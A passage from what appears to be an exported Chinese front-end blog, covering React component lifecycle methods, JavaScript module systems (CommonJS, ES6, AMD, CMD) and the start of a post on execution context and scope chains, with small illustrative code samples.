<p>实际上将 <code>constructor</code> 作为生命周期钩子这一说法并不确切。<code>constructor</code> 作为 class(ES6) 中的 <em>构造方法</em> ，通过 <code>new</code> 关键字创建对象实例时会自动调用，用于返回实例对象（this）。React 的生命周期定义在 <code>Component</code> 这个基类中，在执行 <code>constructor()</code> 后组件才会继承 <code>Component</code> 基类，才可以使用这些生命周期方法。所以 <code>hooks</code> 范式中没有生命周期，因为没有使用对象（返回函数组件）。</p>
<p><strong>使用场景：</strong></p>
<ol>
<li><p><code>super(props)</code> 用于调用父组件（基类）的构造方法，并将父组件的 <code>props</code> 注入给子组件。</p>
</li>
<li><p>在 <code>this.state</code> 中可以初始化 <code>state</code> 内容。</p>
</li>
</ol>
<pre><code class="javascript">class User extends Component &#123;
  constructor(props) &#123;
    super(props);
    this.state = &#123;
      name: &#39;anonymous&#39;,
      gender: &#39;male&#39;
    &#125;
  &#125;
&#125;</code></pre>
<h3 id="Mounting-挂载阶段"><a href="#Mounting-挂载阶段" class="headerlink" title="Mounting (挂载阶段)"></a>Mounting (挂载阶段)</h3><p>该阶段在组件第一次挂载时触发，只会执行一次。</p>
<h5 id="componentWillMount"><a href="#componentWillMount" class="headerlink" title="componentWillMount()"></a>componentWillMount()</h5><p><strong>触发时机：</strong></p>
<p>组件挂在到 DOM <em>前</em> 执行，只会执行一次。</p>
<p><strong>解析：</strong></p>
<p><em>不建议</em> 在该阶段请求网络数据，因为一般网络请求都是以 <em>异步</em> 的方式进行，不能保证在 <code>render()</code> 前就完成，可能还没获取到数据就已经执行了渲染操作。至于初始化 <code>state</code>，可以，但没必要，因为放到 <code>constructor</code> 更直观且主流。</p>
<p><strong>使用场景：</strong></p>
<p>不过 <code>componentWillMount</code> 也不是一无是处，在服务端渲染（SSR）中生命周期不全，<code>componentWillMount</code> 是唯一的生命周期钩子。</p>
<h5 id="render"><a href="#render" class="headerlink" title="render()"></a>render()</h5><p>第一次渲染。</p>
<h5 id="componentDidMount"><a href="#componentDidMount" class="headerlink" title="componentDidMount()"></a>componentDidMount()</h5><p><strong>触发时机：</strong></p>
<p>组件挂在到 DOM <em>后</em> 执行，只会触发一次。</p>
<p><strong>解析：</strong></p>
<p>在该阶段执行网络请求最合理，因为这时候已经完成渲染，有足够的时间去执行 <em>异步请求</em>，能够保证数据安全，且获取数据后一般会进行 <code>setState()</code> 操作，触发重渲染。</p>
<p><strong>使用场景：</strong></p>
<ol>
<li><p>执行网络请求，获取远程数据。</p>
</li>
<li><p>使用 <code>setState()</code> 保存状态，触发重渲染。</p>
</li>
<li><p>使用 <code>ref</code> 操作 DOM，因为这时候组件已经挂载到 DOM 上了。</p>
</li>
</ol>
<pre><code class="javascript">async componentDidMount() &#123;
  const res = await getUserInfo();
  this.setState(&#123; userInfo: res.data &#125;);
&#125;</code></pre>
<h3 id="Updation-更新阶段"><a href="#Updation-更新阶段" class="headerlink" title="Updation (更新阶段)"></a>Updation (更新阶段)</h3><p>该阶段在组件 <code>state</code> 或 <code>props</code> 改变时触发，可能触发多次。</p>
<h5 id="componentWillReceiveProps-nextProps"><a href="#componentWillReceiveProps-nextProps" class="headerlink" title="componentWillReceiveProps(nextProps)"></a>componentWillReceiveProps(nextProps)</h5><p><strong>触发时机：</strong></p>
<p>组件挂载完成后，接收到新的 <code>props</code> 时触发，此时还没有触发重渲染。</p>
<p><strong>解析：</strong></p>
<p>可以通过 <code>this.props</code> 获取之前的属性，通过 <code>nextProps</code> 获取之后的属性，进行对比或其他操作。由于此时还没有触发重渲染，所以可以将一些 <em>网络请求</em> 放到这里执行，减轻负担，达到一定的优化效果。</p>
<p><strong>使用场景：</strong></p>
<ol>
<li><p>对比 <code>this.props</code> 和 <code>nextProps</code>，执行后续操作。</p>
</li>
<li><p>子组件发起 <em>网络请求</em>。</p>
</li>
</ol>
<h5 id="shouldComponentUpdate-nextProps-nextState"><a href="#shouldComponentUpdate-nextProps-nextState" class="headerlink" title="shouldComponentUpdate(nextProps, nextState)"></a>shouldComponentUpdate(nextProps, nextState)</h5><p><strong>触发时机：</strong></p>
<p>组件挂载完成后，在接收到新的 <code>state</code> 或 <code>props</code> 时触发。</p>
<p><strong>解析：</strong></p>
<p>可以通过对比 <code>this.state</code> 和 <code>nextState</code>，或 <code>this.props</code> 和 <code>nextProps</code> 是否发生变化，返回一个 <code>boolean</code> 值决定是否重渲染（返回 <code>true</code> 表示本次允许重渲染，返回 <code>false</code> 表示本次不允许重渲染），从而达到性能优化的目的。建议只进行浅比较（不递归比较嵌套对象），因为比较层级过多的话消耗掉会大于重渲染，得不偿失。在 React 15.3 后引入了 <code>PureComponent</code>，代替了 <code>shouldComponentUpdate</code> 自动进行 <em>浅比较</em> 判断 <code>state</code> 或 <code>props</code> 是否更新，从而优化性能，不过它只对子组件生效。</p>
<p><strong>使用场景：</strong></p>
<p>判断 <code>state</code> 或 <code>props</code> 是否更新，从而决定是否渲染，达到性能优化的目的。</p>
<pre><code class="javascript">shouldComponentUpdate(nextProps, nextState) &#123;
  return nextState.user !== this.state.user
&#125;</code></pre>
<h5 id="componentWillUpdate-nextProps-nextState"><a href="#componentWillUpdate-nextProps-nextState" class="headerlink" title="componentWillUpdate(nextProps, nextState)"></a>componentWillUpdate(nextProps, nextState)</h5><p><strong>触发时机：</strong></p>
<p><code>state</code> 或 <code>props</code> 发生变化时，重渲染 <em>前</em> 触发。</p>
<p><strong>解析：</strong></p>
<p><em>不能</em> 在这个生命周期调用 <code>setState()</code>，因为每次调用 <code>setState()</code> 触发重渲染都会经过这一生命周期，周而复始引起死循环。另外，若是 <code>shouldComponentUpdate</code> 返回了 <code>fasle</code> 阻止了重渲染，则不会触发 <code>componentWillUpdate</code>。</p>
<p><strong>使用场景：</strong></p>
<p>可以做一些动画或 DOM 的初始化。</p>
<h5 id="render-1"><a href="#render-1" class="headerlink" title="render()"></a>render()</h5><p>重渲染。</p>
<h5 id="componentDidUpdate-prevProps-prevState"><a href="#componentDidUpdate-prevProps-prevState" class="headerlink" title="componentDidUpdate(prevProps, prevState)"></a>componentDidUpdate(prevProps, prevState)</h5><p><strong>触发时机：</strong></p>
<p>组件更新，重渲染 <em>后</em> 触发。</p>
<p><strong>解析：</strong></p>
<p>若是 <code>shouldComponentUpdate</code> 返回了 <code>fasle</code> 阻止了重渲染，也不会执行到这一步。</p>
<p><strong>使用场景：</strong></p>
<ol>
<li>使用 <code>ref</code> 操作 DOM，因为这时候组件已经重渲染，且挂载到 DOM 上了。</li>
</ol>
<p><strong>解析：</strong></p>
<h3 id="Unmounting-卸载阶段"><a href="#Unmounting-卸载阶段" class="headerlink" title="Unmounting (卸载阶段)"></a>Unmounting (卸载阶段)</h3><p>该阶段在组件销毁时触发，只会触发一次。</p>
<h5 id="componentWillUnmount"><a href="#componentWillUnmount" class="headerlink" title="componentWillUnmount()"></a>componentWillUnmount()</h5><p><strong>触发时机：</strong></p>
<p>在组件卸载之前执行。</p>
<p><strong>解析：</strong></p>
<p>由于是单页面应用（SPA），在路由跳转后，页面内的一些 <em>事件订阅</em> 或 <em>定时操作</em> 并不会主动销毁，任然留在内存中继续执行。此时会引发内存泄漏，影响性能；此外，由于组件已经销毁，<code>this</code> 已经解除链接，获取不到相关引用变量， 会造成 <code>underfined</code> 报错。</p>
<p><strong>使用场景：</strong></p>
<p>执行一些必要的清理操作，例如 <code>clearInterval()</code> 、 <code>clearTimeout()</code>等。</p>
<pre><code class="javascript">componentWillUnmount() &#123;
  this.timer &amp;&amp; clearTimeout(this.timer);
&#125;</code></pre>
<h1 id="v16-0-后的生命周期"><a href="#v16-0-后的生命周期" class="headerlink" title="v16.0 后的生命周期"></a>v16.0 后的生命周期</h1><p>在 React 16.0 之后，废除了 <code>componentWillMount</code>、<code>componentWillUpdate</code>、<code>componentWillReceiveProps</code> 这三个生命周期，将在 17.0 之后移除。因为引入了 <code>fiber</code> 架构，<code>render()</code> 前一阶段可以被打断并且执行多次，导致这些生命周期变得不可控。不过为了平滑升级，暂时可以使用 <code>UNSAFE_componentWillMount</code>、<code>UNSAFE_componentWillUpdate</code>、<code>UNSAFE_componentWillReceiveProps</code> 代替。</p>
<p>取而代之引入了两个新的生命周期：<code>getDerivedStateFromProps</code>、<code>getSnapshotBeforeUpdate</code>。</p>
<p><strong>组件挂载：</strong> getDerivedStateFromProps -&gt; render -&gt; componentDidMount</p>
<p><strong>组件更新：</strong> getDerivedStateFromProps -&gt; shoudlComponentUpdate -&gt; render -&gt; getSnapshotBeforeUpdate -&gt; componentDidUpdate</p>
<p><strong>组件销毁：</strong> componentWillUnmount</p>
<h5 id="static-getDerivedStateFromProps-nextProps-prevState"><a href="#static-getDerivedStateFromProps-nextProps-prevState" class="headerlink" title="static getDerivedStateFromProps(nextProps, prevState)"></a>static getDerivedStateFromProps(nextProps, prevState)</h5><p><strong>触发时机：</strong></p>
<p>每次渲染前调用。（包括首次渲染和重渲染）</p>
<p><strong>解析：</strong></p>
<p>首先这是一个 <code>static</code> 方法，不能使用 <code>this</code> 访问对象属性，所以也就不能直接使用 <code>this.setState()</code> 方法了。该方法接受两个参数，<code>nextProps</code> 指接收的新属性，<code>prevState</code> 指当前状态，最后返回一个对象来更新当前 <code>state</code> 状态，如果不需要渲染则返回一个 <code>null</code>。本质上就是讲传入的 <code>props</code> 映射到 <code>state</code>。</p>
<p><strong>使用场景：</strong></p>
<p>替代之前的 <code>componentWillReceiveProps</code> 等生命周期。</p>
<pre><code class="javascript">static getDerivedStateFromProps(nextProps, prevState) &#123;
  const &#123;username&#125; = nextProps;
  if (username !== prevState.username) &#123;
    return &#123;
      username,
    &#125;;
  &#125;
  return null;
&#125;</code></pre>
<h5 id="getSnapshotBeforeUpdate-prevProps-prevState"><a href="#getSnapshotBeforeUpdate-prevProps-prevState" class="headerlink" title="getSnapshotBeforeUpdate(prevProps, prevState)"></a>getSnapshotBeforeUpdate(prevProps, prevState)</h5><p><strong>触发时机：</strong></p>
<p>在渲染后，<code>componentDidUpdate</code> 前调用。</p>
<p><strong>解析：</strong></p>
<p>该方法接受两个参数，<code>prevProps</code> 指当前属性，<code>prevState</code> 指当前状态，最后返回一个对象传递给 <code>componentDidUpdate</code>。</p>
<p><strong>使用场景：</strong></p>
<p>用于替代 <code>componentWillUpdate</code> 等生命周期。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/45091185">React渲染原理</a></p>
</blockquote>
<blockquote>
<p><a href="https://segmentfault.com/a/1190000016494335?utm_source=tag-newest">react如何通过shouldComponentUpdate来减少重复渲染</a></p>
</blockquote>
<blockquote>
<p><a href="https://juejin.im/post/5b6f1800f265da282d45a79a">我对 React v16.4 生命周期的理解</a></p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - 模块化</title>
    <url>/2020/04/12/js-module/</url>
    <content><![CDATA[<p>关于JavaScript中<code>模块化</code>的一些总结。</p>
<span id="more"></span>

<p>在发开大型软件项目时，一般需要通过<code>模块化</code>来管理代码。将一段有逻辑联系的代码封装成<code>模块</code>，其内部数据与实现是私有的，将一些公用接口暴露出去，与其他模块进行通信，最后组织成程序。</p>
<p>模块化的作用:</p>
<ul>
<li>避免命名冲突</li>
<li>按需加载</li>
<li>提高复用程度</li>
<li>提高可维护性</li>
</ul>
<blockquote>
<p>软件工程提倡<strong>高内聚，低耦合</strong>。</p>
</blockquote>
<p>目前流行的JS模块化规范有<code>CommonJS</code>、<code>AMD</code>、<code>CMD</code>和<code>ES6模块</code>。通常将一个JS文件作为一个模块，向外暴露特定的变量和函数。</p>
<h3 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h3><p><code>Node</code>是<code>CommonJS</code>规范的主要实践者，通过<code>module</code>、<code>exports</code>、<code>require</code>等关键词实现<code>模块加载</code>和<code>模块定义</code>。</p>
<p>在服务端一般模块文件都存在本地，读取速度比较快，所以使用同步加载方式一般没问题。</p>
<p><code>CommonJS</code>以<strong>同步</strong>方式加载模块。</p>
<h5 id="模块引用"><a href="#模块引用" class="headerlink" title="模块引用"></a>模块引用</h5><p>使用<code>require()</code>方法引入模块，传入的变量为模块标识符。</p>
<p>在Node中有三种模块类型，<code>核心模块</code>、<code>文件模块</code>、<code>自定义模块</code>。</p>
<ul>
<li>核心模块: Node内置的一些模块，例如<code>http</code>、<code>fs</code>、<code>path</code>等，模块标识符为<strong>模块名称</strong>。在Node的源码编译过程中已经将这些模块编译为二进制代码，所以加载过程很快。</li>
<li>文件模块: 一般为用户自己定义的一些模块，一个文件就是一个模块，模块标识符为<strong>文件路径</strong>。由于指明了文件加载路径，所以加载速度较快。</li>
<li>自定义模块: 用户使用<code>npm</code>等包管理工具安装的模块，一般保存在<code>node_moudles</code>目录下，模块标识符为<strong>模块名称</strong>。由于需要按照<code>npm</code>的加载规则匹配模块，所以加载过程较慢。</li>
</ul>
<pre><code class="javascript">//main.js

var http = require(&#39;http&#39;);  //引入核心模块
var math = require(&#39;./math&#39;);  //引入文件模块
var koa = require(&#39;koa&#39;);  //引入自定义模块

console.log(math.add(1, 2));  //使用math模块，输出3</code></pre>
<h5 id="模块定义"><a href="#模块定义" class="headerlink" title="模块定义"></a>模块定义</h5><p>对于文件模块，我们需要自己定义，一个文件就是一个模块。在CommonJS规范中<code>exports</code>对象是模块的唯一出口，定义导出的变量或方法。</p>
<pre><code class="javascript">//math.js

exports.add = function (a, b) &#123;  //导出add方法
  return a + b;
&#125;

exports.subtract = function (a, b) &#123;  //导出subtract方法
  return a - b;
&#125;</code></pre>
<p>但是Node并不是完全按照CommonJS规范实现的，而是根据自身需要做了一些取舍，所以表现出一些特性。在Node中，我们更推荐使用<code>module.exports</code>来定义模块。</p>
<pre><code class="javascript">//math.js

function add (a, b) &#123;
  return a + b;
&#125;

function subtract (a, b) &#123;
  return a - b;
&#125;

module.exports = &#123;
  add: add,
  subtract: subtract
&#125;;</code></pre>
<h5 id="module-exports-和-exports"><a href="#module-exports-和-exports" class="headerlink" title="module.exports 和 exports"></a>module.exports 和 exports</h5><p>在Node中，一个模块(文件)就是一个闭包，通过闭包机制实现了命名空间。</p>
<pre><code class="javascript">(function (exports, require, module, __filename, __dirname) &#123;
  //code
&#125;)();</code></pre>
<p>每执行一个文件，就会自动创建一个<code>module</code>对象，而<code>module.exports</code>是其中的一个属性。所以<code>module.exports</code>才是真正的模块对象，<code>exports</code>只是对它的一个引用。</p>
<p>因此，使用<code>module.exports</code>可以对该变量重新赋值，而使用<code>exports</code>不能进行重新赋值，只能对<code>exports</code>下的属性进行赋值，如<code>exports.add = add</code>。</p>
<h3 id="ES6模块"><a href="#ES6模块" class="headerlink" title="ES6模块"></a>ES6模块</h3><p><code>ES6</code>标准在语法层面上实现了模块化，通过使用<code>import</code>和<code>export</code>实现<code>模块加载</code>和<code>模块定义</code>。由于是标准规范，使用在客户端和服务端都可以使用，一般是配合<code>webpack</code>等打包工具进行管理，因为现阶段<code>ES6</code>还需通过<code>babel</code>进行编码。</p>
<p>不同于其他三种模块化方式，<code>ES6模块</code>是在<strong>编译过程中</strong>加载模块，而不是动态地引入一个对象。</p>
<h5 id="模块定义-1"><a href="#模块定义-1" class="headerlink" title="模块定义"></a>模块定义</h5><p>使用<code>export</code>命令导出模块，也可以使用<code>export default</code>指定默认输出模块。</p>
<pre><code class="javascript">//math.js

function add (a, b) &#123;
  return a + b;
&#125;

function subtract (a, b) &#123;
  return a - b;
&#125;

export &#123;add, subtract&#125;  //输出函数</code></pre>
<h5 id="模块引用-1"><a href="#模块引用-1" class="headerlink" title="模块引用"></a>模块引用</h5><p>使用<code>import</code>命令导入模块，可以使用<code>解构赋值</code>的方式导入。</p>
<pre><code class="javascript">import &#123;add, subtract&#125; from &#39;./math&#39;;  //引入add和subtract函数

console.log(add(1, 2));  //使用add函数，输出3</code></pre>
<h5 id="CommonJS-和-ES6模块"><a href="#CommonJS-和-ES6模块" class="headerlink" title="CommonJS 和 ES6模块"></a>CommonJS 和 ES6模块</h5><blockquote>
<p>摘自 - 前端模块化：CommonJS,AMD,CMD,ES6</p>
</blockquote>
<h6 id="CommonJS模块输出的是一个值的拷贝，ES6模块输出的是值的引用"><a href="#CommonJS模块输出的是一个值的拷贝，ES6模块输出的是值的引用" class="headerlink" title="CommonJS模块输出的是一个值的拷贝，ES6模块输出的是值的引用"></a>CommonJS模块输出的是一个值的拷贝，ES6模块输出的是值的引用</h6><ul>
<li><code>CommonJS</code>模块输出的是值的拷贝，也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。</li>
<li><code>ES6模块</code>的运行机制与<code>CommonJS</code>不一样。JS引擎对脚本静态分析的时候，遇到模块加载命令<code>import</code>，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。换句话说，<code>ES6</code>的<code>import</code>有点像<code>Unix</code>系统的<code>符号连接</code>，原始值变了，<code>import</code>加载的值也会跟着变。因此，<code>ES6模块</code>是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。</li>
</ul>
<h6 id="CommonJS模块是运行时加载，ES6模块是编译时输出接口"><a href="#CommonJS模块是运行时加载，ES6模块是编译时输出接口" class="headerlink" title="CommonJS模块是运行时加载，ES6模块是编译时输出接口"></a>CommonJS模块是运行时加载，ES6模块是编译时输出接口</h6><ul>
<li>运行时加载: <code>CommonJS</code>模块就是对象；即在输入时是先加载整个模块，生成一个对象，然后再从这个对象上面读取方法，这种加载称为“运行时加载”。</li>
<li>编译时加载: <code>ES6模块</code>不是对象，而是通过<code>export</code>命令显式指定输出的代码，<code>import</code>时采用静态命令的形式。即在<code>import</code>时可以指定加载某个输出值，而不是加载整个模块，这种加载称为“编译时加载”。</li>
</ul>
<p><code>CommonJS</code>加载的是一个对象(即module.exports属性)，该对象只有在脚本运行完才会生成。而<code>ES6模块</code>不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。</p>
<h3 id="AMD"><a href="#AMD" class="headerlink" title="AMD"></a>AMD</h3><p><code>require.js</code>是<code>AMD</code>规范的主要实践者，通过<code>define</code>定义模块、<code>require</code>引入模块。</p>
<p>在客户端，一般是远程加载模块，受网络限制，使用异步方式更合理。</p>
<p><code>AMD</code>以<strong>异步</strong>方式加载模块，推崇依赖前置，提前执行，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。</p>
<h5 id="模块引用-2"><a href="#模块引用-2" class="headerlink" title="模块引用"></a>模块引用</h5><p>首先需要在<code>HTML</code>中使用<code>&lt;script&gt;</code>引入<code>require.js</code>和主模块。</p>
<pre><code class="html">// HTML
&lt;script src=&quot;js/require.js&quot; data-main=&quot;js/main&quot;&gt;&lt;/script&gt;  //引入require.js 和 main.js</code></pre>
<p>使用<code>require.config()</code>引入模块文件，可以设置路径前缀、设置模块名称。再使用<code>require()</code>使用模块，如下方式设置别名。</p>
<pre><code class="javascript">//main.js

//模块引入
require.config(&#123;
  baseUrl: &quot;js/lib&quot;,  //路径前缀
  paths: &#123;
    &quot;jquery&quot;: &quot;jquery.min&quot;,  //实际路径为js/lib/jquery.min.js
    &quot;underscore&quot;: &quot;underscore.min&quot;,
    &quot;math&quot;: &quot;math&quot;
  &#125;
&#125;);

//模块使用
require([&quot;jquery&quot;, &quot;underscore&quot;, &quot;math&quot;], function($, _, math)&#123;  //使用别名
  //code...
  $(&quot;body&quot;).addClass(&quot;lock-screen&quot;);  //通过$别名使用jQuery
  console.log(math.add(1, 2));  //通过math别名使用math模块，输出3
&#125;);</code></pre>
<h5 id="模块定义-2"><a href="#模块定义-2" class="headerlink" title="模块定义"></a>模块定义</h5><p>使用<code>define()</code>方法定义一个模块，模块内容放在<code>回调函数</code>中，并通过<code>return</code>抛出。</p>
<pre><code class="javascript">// math.js

// 定义math模块
define(function () &#123;
  function add(x, y) &#123;
    return x + y;
  &#125;

  function subtract (a, b) &#123;
    return a - b;
  &#125;

  return &#123;
    add: add,
    subtract: subtract
  &#125;;
&#125;);

// 定义一个依赖jQuery的模块
define([&#39;jquery&#39;],function($)&#123;

  function setClass() &#123;
    $(&quot;body&quot;).addClass(&quot;lock-screen&quot;);
  &#125;

  return &#123;
    setClass: setClass
  &#125;;
&#125;)</code></pre>
<h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p><code>sea.js</code>是<code>CMD</code>规范的主要实践者，<code>CMD</code>吸收了<code>CommonJS</code>和<code>AMD</code>。</p>
<p><code>CMD</code>以<strong>异步</strong>方式加载模块，推崇依赖就近，延迟执行，在代码中引入模块并运行。</p>
<h5 id="模块引用-3"><a href="#模块引用-3" class="headerlink" title="模块引用"></a>模块引用</h5><p>首先需要在<code>HTML</code>中使用<code>&lt;script&gt;</code>引入<code>sea.js</code>和主模块。</p>
<pre><code class="html">// HTML
&lt;script src=&quot;js/sea.js&quot; data-main=&quot;js/main&quot;&gt;&lt;/script&gt;  //引入sea.js 和 main.js</code></pre>
<p>使用<code>define()</code>创建作用域，在<code>回调函数</code>(传入参数reuqire)中通过<code>require()</code>引入模块。</p>
<pre><code class="javascript">// main.js

define(function (require) &#123;
  var math = require(&#39;./math&#39;);
  console.log(math.add(1, 2));  //使用math模块，输出3
&#125;)</code></pre>
<h5 id="模块定义-3"><a href="#模块定义-3" class="headerlink" title="模块定义"></a>模块定义</h5><pre><code class="javascript">// math.js

define(function (require, exports, module) &#123;
  function add(x, y) &#123;
    return x + y;
  &#125;

  function subtract (a, b) &#123;
    return a - b;
  &#125;

  module.exports = &#123;
    add: add,
    subtract: subtract
  &#125;
&#125;)</code></pre>
<h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>JS的全局变量其实是定义在一个window对象下的，例如<code>var history = 1;</code>其实是<code>var window.history = 1;</code>。然而，window对象又有许多的内置属性，如果我们自定义的属性刚好和内置属性重名的话，就会起冲突。</p>
<p>因此，为了避免变量冲突，就有必要引入<code>命名空间</code>来隔离变量作用域，其实是用到<code>闭包</code>和<code>自触发函数</code>来模拟的。许多<code>模块化</code>的库都是基于这一原理。</p>
<h5 id="自触发函数"><a href="#自触发函数" class="headerlink" title="自触发函数"></a>自触发函数</h5><p>先来看看<code>自触发函数</code>(IIFE)，在函数定义后立即触发。因为立即执行，后续一般不会再调用，所以可以使用匿名函数。</p>
<pre><code class="javascript">// Type 1, 没有匿名，但是立即触发
start();
function start() &#123;
  //...
&#125;

//Tpye 2
(function () &#123;
  //...
&#125;)();

//Type 3
!function () &#123;
  //...
&#125;();

Tpye 4
;(function() &#123;
  //...
&#125;)();</code></pre>
<h5 id="命名空间-1"><a href="#命名空间-1" class="headerlink" title="命名空间"></a>命名空间</h5><p>结合<code>闭包</code>和<code>立即执行函数</code>，我们就可以很好的封装一个模块了。<code>闭包</code>用来限定作用域（命名空间），<code>立即执行函数</code>避免全局变量名字冲突。</p>
<p><code>jQuery</code>就是用于以上两种机制，暴露出了一个<code>$</code>，来操作内部方法。</p>
<p>以下例子，封住了<code>user</code>模块，解决变量冲突。</p>
<pre><code class="javascript">(function(window) &#123;
  var name;

  function getName() &#123;
    return name;
  &#125;

  function setName(name) &#123;
    name = name;
  &#125;

  window.user = &#123; getName, setName &#125;;
&#125;)(window);

user.setName(&#39;zhaoo&#39;);
console.log(user.getName()); // zhaoo</code></pre>
<p>此外，ES6中的<code>let</code>和<code>const</code>可以产生一个块级作用域，其实也是用到了该原理。用<code>babel</code>编译后是如下ES5代码，是不是一目了然。</p>
<pre><code class="javascript">// ES6
&#123;
  let a = &quot;abc&quot;;
&#125;;
console.log(a);  // Error, a is not defind</code></pre>
<pre><code class="javascript">// ES5
(function()&#123;
  var a = &quot;abc&quot;;
&#125;)();
console.log(a);  // Error, a is not defind</code></pre>
<p>命名空间模式也存在许多不足，一般在<code>ES5</code>年代比较多见。现在一般都是用<code>模块化</code>的方式直接引入文件模块了。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><blockquote>
<p><a href="https://juejin.im/post/5aaa37c8f265da23945f365c#heading-4">前端模块化：CommonJS,AMD,CMD,ES6</a></p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>JS - 执行上下文/作用域链/闭包</title>
    <url>/2020/04/12/js-closure/</url>
    <content><![CDATA[<p>对于<code>JavaScript</code>中<code>执行上下文</code>、<code>作用域</code>、<code>闭包</code>等概念的一些思考。</p>
<span id="more"></span>

<h3 id="执行上下文"><a href="#执行上下文" class="headerlink" title="执行上下文"></a>执行上下文</h3><p><code>执行上下文</code>(Execution Context)用一句话说就是JS代码执行时的抽象<code>环境</code>。</p>
<p>例如在函数被 <em><code>调用</code></em> 时会生成一个<code>函数执行上下文</code>，就是这个函数的环境，这里强调 <em><code>调用</code></em> ，就是说是运行时的动态过程。</p>
<p>举个栗子，一个国家就好比是一个<code>执行上下文</code>，公民就好比是<code>变量</code>，许多公民(不出境的那种)在国家这个范围内活动；再往下<code>执行上下文</code>有嵌套，那中国就可以比作<code>全局执行上下文</code>，浙江省就是第一层<code>函数执行上下文</code>，杭州市就是第二层<code>函数执行上下文</code>。</p>
<h5 id="三种类型"><a href="#三种类型" class="headerlink" title="三种类型"></a>三种类型</h5><p>JS中一共有三种执行上下文类型：</p>
<ul>
<li><p><strong>全局执行上下文</strong>: 默认的最底层环境，任何不在<code>函数</code>或<code>eval</code>内部的代码都属于<code>全局执行上下文</code>，一段程序中只有一个全局执行上下文。</p>
</li>
<li><p><strong>函数执行上下文</strong>: 当一个函数被 <em><code>调用</code></em> 时，就会创建一个<code>函数执行上下文</code>，并进行一些准备工作。</p>
</li>
<li><p><strong>eval执行上下文</strong>: 执行eval函数时会创建一个<code>eval执行上下文</code>，类似于<code>函数执行上下文</code>。因为实际中用到eval的情况比较少，下文不再讨论。</p>
</li>
</ul>
<p>以下代码创建的执行上下文如图所示:</p>
<pre><code class="javascript">var a = 1;
var b = 2;

function aa() &#123;
  var c = 3;
  bb();
&#125;

function bb() &#123;
  var d = 4;
&#125;

function cc() &#123;
  var e = 5;
&#125;

aa();
cc();</code></pre>
<div style="text-align: center">
  <img  src="https://pic.izhaoo.com/20200412192325.jpg"   /><span class="image-caption">三种类型的执行上下文</span>
</div>

<h5 id="执行栈"><a href="#执行栈" class="headerlink" title="执行栈"></a>执行栈</h5><p>在JS中，是以<code>栈</code>(后进先出)这种数据结构存储<code>执行上下文</code>的，也就是我们所说的 <em><code>执行栈</code></em>。</p>
<p>执行JS代码时，JS引擎首先会创建一个<code>全局执行上下文</code>，并压入栈底；之后每当 <em><code>调用</code></em> 一个函数时，都会为该函数创建一个<code>函数执行上下文</code>，并压入栈。</p>
<p>之后引擎会执行栈顶的函数，函数执行结束后，该<code>函数执行上下文</code>从栈中弹出；再执行下一个函数，直到全部出栈。</p>
<p>还是这段代码，执行栈如图所示:</p>
<pre><code class="javascript">var a = 1;
var b = 2;

function aa() &#123;
  var c = 3;
  bb();
&#125;

function bb() &#123;
  var d = 4;
&#125;

function cc() &#123;
  var e = 5;
&#125;

aa();
cc();</code></pre>
<div style="text-align: center">
  <img  src="https://pic.izhaoo.com/20200412193736.jpg"  /><span class="image-caption">执行栈</span>
</div>

<h5 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h5><p>执行上下文的执行过程分为两个阶段：<code>创建阶段</code>和<code>执行阶段</code>，这部分内容后面会解释到。</p>
<ul>
<li><p><strong>创建阶段</strong>: 例如调用函数时，在执行代码前，将创建执行上下文，会处理三件事: <code>绑定this</code> → <code>创建词法环境</code> → <code>创建变量环境</code></p>
</li>
<li><p><strong>执行阶段</strong>: 对变量进行赋值，执行代码。</p>
</li>
</ul>
<h3 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h3><h5 id="静态作用域"><a href="#静态作用域" class="headerlink" title="静态作用域"></a>静态作用域</h5><p>作用域是指程序代码中定义变量的区域，JS中采用的是<code>静态作用域</code>(词法作用域)。作用域规定了如何查找变量，也就是确定当前执行代码对变量的访问权限。</p>
<p>还是上面的栗子，<code>执行上下文</code>是国家这个概念上的环境，<code>作用域</code>就是这个国家的实际作用范围；比如中国就是雄鸡这块版图，人民群众在没办护照的情况下是不能跑到国外去的。</p>
<p>静态作用域 vs 动态作用域</p>
<ul>
<li><p>静态作用域: 作用域在函数<strong>定义</strong>时决定</p>
</li>
<li><p>动态作用域: 作用域在函数<strong>调用</strong>时决定</p>
</li>
</ul>
<p>因为JS是<code>静态作用域</code>，所以直接看代码中变量的定义位置即可，而不是看调用过程。</p>
<p>在以下代码中，运行会输出 1</p>
<pre><code class="javascript">var a = 1;

function aa() &#123;
  console.log(a);  // 输出 1
&#125;

function bb() &#123;
  var a = 2;
  aa();
&#125;

bb();</code></pre>
<h5 id="作用域链-1"><a href="#作用域链-1" class="headerlink" title="作用域链"></a>作用域链</h5><p>在代码中，我们经常会进行函数嵌套，<code>作用域</code>会随着嵌套结构向顶层链接，形成<code>作用域链</code>。这个概念和<code>原型链</code>类似。</p>
<p>还是看代码:</p>
<pre><code class="javascript">var a = 1;

function aa() &#123;
  var b = 2;
  function bb() &#123;
    console.log(a + b);  // 输出 1和2
  &#125;
  bb();
&#125;

aa();</code></pre>
<p>在函数<code>bb()作用域</code>中并没有定义变量<code>a</code>和<code>b</code>，所以会通过<code>作用域链</code>往上层查找，在父函数<code>aa()作用域</code>中找到<code>a</code>，在<code>全局作用域</code>中找到<code>b</code>，最后输出。</p>
